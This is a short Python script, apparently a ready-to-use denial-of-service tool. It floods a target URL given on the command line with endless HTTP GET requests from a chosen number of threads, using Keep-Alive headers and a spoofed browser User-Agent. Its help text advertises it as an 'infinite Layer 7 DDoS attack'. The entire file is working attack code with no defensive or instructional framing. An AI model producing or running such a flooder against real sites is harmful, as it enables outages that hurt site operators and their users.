import argparse
import requests
from threading import Thread
import socket

def infinity_ddos_attack(infinity_target_url, infinity_thread_count):
    infinity_url = infinity_target_url
    if "http://" not in infinity_url and "https://" not in infinity_url:
        infinity_url = f"http://{infinity_url}"

    infinity_ip = socket.gethostbyname(infinity_url.split("/")[2])
    infinity_port = 80 if "http://" in infinity_url else 443

    def infinity_send_request():
        headers = {
            'Connection': 'Keep-Alive',
            'Keep-Alive': '300',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'
        }
        while True:
            requests.get(infinity_url, headers=headers)

    infinity_Thread_list = []
    for i in range(infinity_thread_count):
        infinity_Thread = Thread(target=infinity_send_request)
        infinity_Thread.start()
        infinity_Thread_list.append(infinity_Thread)

    for infinity_Thread in infinity_Thread_list:
        infinity_Thread.join()

infinity_parser = argparse.ArgumentParser(description="Unleash an infinite Layer 7 DDoS attack with Keep-Alive header!")
infinity_parser.add_argument('infinity_target_url', type=str, help="Target URL")
infinity_parser.add_argument('infinity_thread_count', type=int, help="Number of threads to use")

infinity_args = infinity_parser.parse_args()

infinity_ddos_attack(infinity_args.infinity_target_url, infinity_args.infinity_thread_count)